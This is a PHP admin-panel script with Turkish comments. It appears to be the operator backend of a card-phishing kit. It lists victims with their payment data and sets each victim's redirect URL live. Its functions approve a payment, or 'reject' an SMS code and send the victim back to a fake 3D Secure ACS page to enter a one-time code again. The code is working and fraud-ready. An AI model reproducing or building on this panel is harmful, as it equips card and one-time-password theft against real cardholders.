<?php
session_start();

// Admin kontrolü
if (!isset($_SESSION['admin_logged_in'])) {
    die(json_encode(['success' => false, 'message' => 'Yetkisiz erişim']));
}

// Config dosyasını dahil et
require_once 'config.php';

// Veritabanı bağlantısı
$pdo = getDbConnection();

$action = $_REQUEST['action'] ?? '';

switch($action) {
    case 'send_redirect':
        sendRedirect($pdo);
        break;
    
    case 'get_details':
        getDetails($pdo);
        break;
    
    case 'update_status':
        updateStatus($pdo);
        break;
    
    case 'get_all_users':
        getAllUsers($pdo);
        break;
    
    case 'approve_payment':
        approvePayment($pdo);
        break;
    
    case 'reject_sms':
        rejectSMS($pdo);
        break;
    
    case 'reject_card':
        rejectCard($pdo);
        break;
    
    default:
        echo json_encode(['success' => false, 'message' => 'Geçersiz işlem']);
}

function sendRedirect($pdo) {
    $userId = $_POST['user_id'] ?? 0;
    $redirectUrl = $_POST['redirect_url'] ?? '';
    
    if (!$userId || !$redirectUrl) {
        echo json_encode(['success' => false, 'message' => 'Eksik parametreler']);
        return;
    }
    
    try {
        $stmt = $pdo->prepare("UPDATE users SET redirect_url = ?, updated_at = NOW() WHERE id = ?");
        $stmt->execute([$redirectUrl, $userId]);
        
        echo json_encode(['success' => true, 'message' => 'Redirect URL gönderildi']);
    } catch(PDOException $e) {
        echo json_encode(['success' => false, 'message' => 'Veritabanı hatası: ' . $e->getMessage()]);
    }
}

function getDetails($pdo) {
    $userId = $_GET['user_id'] ?? 0;
    
    if (!$userId) {
        echo json_encode(['success' => false, 'message' => 'Kullanıcı ID gerekli']);
        return;
    }
    
    try {
        $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
        $stmt->execute([$userId]);
        $user = $stmt->fetch(PDO::FETCH_ASSOC);
        
        if ($user) {
            echo json_encode(['success' => true, 'user' => $user]);
        } else {
            echo json_encode(['success' => false, 'message' => 'Kullanıcı bulunamadı']);
        }
    } catch(PDOException $e) {
        echo json_encode(['success' => false, 'message' => 'Veritabanı hatası: ' . $e->getMessage()]);
    }
}

function updateStatus($pdo) {
    $userId = $_POST['user_id'] ?? 0;
    $status = $_POST['status'] ?? '';
    
    if (!$userId || !$status) {
        echo json_encode(['success' => false, 'message' => 'Eksik parametreler']);
        return;
    }
    
    try {
        $stmt = $pdo->prepare("UPDATE users SET payment_status = ?, updated_at = NOW() WHERE id = ?");
        $stmt->execute([$status, $userId]);
        
        echo json_encode(['success' => true, 'message' => 'Durum güncellendi']);
    } catch(PDOException $e) {
        echo json_encode(['success' => false, 'message' => 'Veritabanı hatası: ' . $e->getMessage()]);
    }
}

function getAllUsers($pdo) {
    try {
        $stmt = $pdo->query("SELECT * FROM users ORDER BY created_at DESC");
        $users = $stmt->fetchAll(PDO::FETCH_ASSOC);
        
        // İstatistikleri hesapla
        $stats = [
            'total' => count($users),
            'pending' => count(array_filter($users, fn($u) => $u['payment_status'] === 'pending')),
            'completed' => count(array_filter($users, fn($u) => $u['payment_status'] === 'approved' || $u['payment_status'] === 'completed')),
            'totalAmount' => number_format(array_sum(array_column($users, 'total')), 2)
        ];
        
        echo json_encode(['success' => true, 'users' => $users, 'stats' => $stats]);
    } catch(PDOException $e) {
        echo json_encode(['success' => false, 'message' => 'Veritabanı hatası: ' . $e->getMessage()]);
    }
}

function approvePayment($pdo) {
    $userId = $_POST['user_id'] ?? 0;
    
    if (!$userId) {
        echo json_encode(['success' => false, 'message' => 'Kullanıcı ID gerekli']);
        return;
    }
    
    try {
        // Ödemeyi onayla ve success.php'ye yönlendir
        $stmt = $pdo->prepare("UPDATE users SET payment_status = 'approved', redirect_url = 'success.php', updated_at = NOW() WHERE id = ?");
        $stmt->execute([$userId]);
        
        echo json_encode(['success' => true, 'message' => 'Ödeme onaylandı']);
    } catch(PDOException $e) {
        echo json_encode(['success' => false, 'message' => 'Veritabanı hatası: ' . $e->getMessage()]);
    }
}

function rejectSMS($pdo) {
    $userId = $_POST['user_id'] ?? 0;
    
    if (!$userId) {
        echo json_encode(['success' => false, 'message' => 'Kullanıcı ID gerekli']);
        return;
    }
    
    try {
        // SMS hatalı - tekrar 3D sayfasına yönlendir (hata parametresi ile)
        $stmt = $pdo->prepare("UPDATE users SET payment_status = 'sms_waiting', redirect_url = 'acs/diger.php?hata=true', updated_at = NOW() WHERE id = ?");
        $stmt->execute([$userId]);
        
        echo json_encode(['success' => true, 'message' => 'Kullanıcı SMS sayfasına yönlendirildi']);
    } catch(PDOException $e) {
        echo json_encode(['success' => false, 'message' => 'Veritabanı hatası: ' . $e->getMessage()]);
    }
}

function rejectCard($pdo) {
    $userId = $_POST['user_id'] ?? 0;
    
    if (!$userId) {
        echo json_encode(['success' => false, 'message' => 'Kullanıcı ID gerekli']);
        return;
    }
    
    try {
        // Kart hatalı - hata sayfasına yönlendir
        $stmt = $pdo->prepare("UPDATE users SET payment_status = 'rejected_card', redirect_url = 'error_card.php', updated_at = NOW() WHERE id = ?");
        $stmt->execute([$userId]);
        
        echo json_encode(['success' => true, 'message' => 'Kullanıcı hata sayfasına yönlendirildi']);
    } catch(PDOException $e) {
        echo json_encode(['success' => false, 'message' => 'Veritabanı hatası: ' . $e->getMessage()]);
    }
}
?>
